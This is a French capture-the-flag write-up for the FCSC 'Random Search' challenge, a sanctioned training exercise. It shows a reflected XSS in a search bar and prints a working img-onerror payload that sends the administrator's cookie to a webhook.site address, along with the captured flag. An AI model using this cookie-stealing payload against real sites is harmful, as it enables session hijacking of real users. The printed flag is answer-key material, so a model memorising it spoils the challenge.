# (Intro) Random Search - 20 points

![image](https://cdn.discordapp.com/attachments/835531052662784010/838814062438776842/1WHy2m.png)

Rien qu'en lisant l'énoncé de ce challenge on peut comprendre qu'on aura donc besoin d'utiliser une XSS permettant la récupération du flag qui est donc égal au cookie de l'administrateur.
On attérit donc sur une page comme celle-ci avec un formulaire de contact et une barre de recherche, dans un premier temps j'ai donc essayé avec un payload basique d'afficher une alerte à l'aide de la barre de recherche.

![image](https://siraak.please-fuck.me/0Bka92.png)

L'alerte est apparue, il y a donc bien une faille XSS dans la barre de recherche. Maintenant la question c'est comment récupérer le cookie de l'administrateur.
On se rend donc ici `http://challenges2.france-cybersecurity-challenge.fr:5001/contact.php` où il y'a la possibilité d'envoyer des urls. J'ai donc refais mon payload afin de récupérer le cookie en envoyant le lien vulnérable à la XSS.

Lien envoyé : `http://challenges2.france-cybersecurity-challenge.fr:5001/index.php?search=<img src=x onerror="this.src='https://webhook.site/48733419-09f7-4fbb-b0a6-6aa1aba6143b/'+document.cookie; this.removeAttribute('onerror');">`, ce qui m'a renvoyé sur le webhook `https://webhook.site/48733419-09f7-4fbb-b0a6-6aa1aba6143b/admin=FCSC%7B4e0451cc88a9a96e7e46947461382008d8c8f4304373b8907964675c27d7c633%7D`

On obtient donc le flag (`FCSC%7B4e0451cc88a9a96e7e46947461382008d8c8f4304373b8907964675c27d7c633%7D`) avec des caractères en héxadécimal vers le début et à la fin, on remplace donc `%7D` par `}` et `%7B` par `{`

# Flag
FCSC{4e0451cc88a9a96e7e46947461382008d8c8f4304373b8907964675c27d7c633}
